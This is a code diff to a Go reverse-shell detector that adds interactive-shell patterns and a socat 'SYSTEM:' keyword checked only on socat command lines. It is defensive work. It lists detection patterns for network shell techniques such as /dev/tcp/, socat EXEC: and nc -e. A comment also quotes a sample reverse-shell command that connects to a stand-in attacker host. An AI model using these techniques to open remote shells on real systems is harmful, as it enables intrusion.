@@ -284,6 +284,14 @@ func DetectReverseShells(processes []Process) []ProcessThreat {
 		{"dash -i", []string{"interactive shell"}, ReverseShellClassStrong},
 		{"ash -i", []string{"interactive shell"}, ReverseShellClassStrong},
 		{"fish -i", []string{"interactive shell"}, ReverseShellClassStrong},
+		{"csh -i", []string{"interactive shell"}, ReverseShellClassStrong},
+		{"tcsh -i", []string{"interactive shell"}, ReverseShellClassStrong},
+		{"mksh -i", []string{"interactive shell"}, ReverseShellClassStrong},
+		{"oksh -i", []string{"interactive shell"}, ReverseShellClassStrong},
+		{"lksh -i", []string{"interactive shell"}, ReverseShellClassStrong},
+		{"posh -i", []string{"interactive shell"}, ReverseShellClassStrong},
+		{"yash -i", []string{"interactive shell"}, ReverseShellClassStrong},
+		{"rbash -i", []string{"interactive shell"}, ReverseShellClassStrong},
 		{"/dev/tcp/", []string{"bash tcp redirect"}, ReverseShellClassStrong},
 		{"/dev/udp/", []string{"bash udp redirect"}, ReverseShellClassStrong},
 
@@ -308,6 +316,10 @@ func DetectReverseShells(processes []Process) []ProcessThreat {
 		// Socat reverse shells
 		{"socat", []string{"socat"}, ReverseShellClassStrong},
 		{"EXEC:", []string{"socat exec"}, ReverseShellClassStrong},
+		// SYSTEM: is socat's sh -c twin of EXEC:. Unlike EXEC: the bare token is
+		// too common elsewhere (kube-system:, log text), so it only counts on a
+		// socat command line — see reverseShellNeedsSocat.
+		{"SYSTEM:", []string{"socat system"}, ReverseShellClassStrong},
 
 		// PowerShell reverse shells (if Wine/mono present)
 		{"powershell", []string{"powershell"}, ReverseShellClassStrong},
@@ -350,6 +362,9 @@ func DetectReverseShells(processes []Process) []ProcessThreat {
 			if reverseShellNeedsNetwork[p.pattern] && !networkRelated {
 				continue
 			}
+			if reverseShellNeedsSocat[p.pattern] && !containsAtTokenStart(cmdLower, "socat") {
+				continue
+			}
 			// The network-indicator gate constrains ONLY the ambiguous
 			// interpreter one-liner class (#842). Strong/unambiguous patterns
 			// (nc -e, socat, EXEC:, /dev/tcp/, an interactive shell,
@@ -390,6 +405,14 @@ func DetectReverseShells(processes []Process) []ProcessThreat {
 var reverseShellNeedsNetwork = map[string]bool{
 	"socat":      true,
 	"powershell": true,
+}
+
+// reverseShellNeedsSocat lists socat address keywords that are self-sufficient
+// evidence only on a socat command line. They fire regardless of a network
+// indicator, so `socat OPENSSL:attacker:443 SYSTEM:sh` (dotless host, decimal
+// or IPv6 address) is still caught.
+var reverseShellNeedsSocat = map[string]bool{
+	"SYSTEM:": true,
 }
 
 // containsAtTokenStart reports whether pat occurs in s at the start of a token,
